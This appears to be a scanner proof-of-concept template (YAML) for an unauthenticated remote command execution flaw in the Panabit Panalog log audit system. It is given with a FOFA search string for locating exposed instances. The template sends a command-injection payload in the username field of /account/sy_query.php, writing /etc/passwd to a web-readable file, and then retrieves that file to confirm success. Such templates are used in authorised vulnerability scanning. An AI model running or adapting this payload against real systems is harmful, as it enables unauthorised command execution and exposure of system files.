id: poc-yaml-panalog-log-audit-system-rce
info:
  name: Panalog 日志审计系统 前台RCE漏洞
  severity: critical
  tags:
  - rce
  finger: Panabit Panalog
  fofa: app="Panabit-Panalog"
variables:
  t1: random_int(1,1000)
requests:
- method: POST
  path: /account/sy_query.php
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: username=;cat+/etc/passwd>{{.t1}}.txt
  expression: status_code == 200
- method: GET
  path: /account/{{.t1}}.txt
  expression: 'status_code == 200

    && contains(body,"root:")

    && contains(body,"/bin")

    && !contains(body,"<")

    '
transport: http
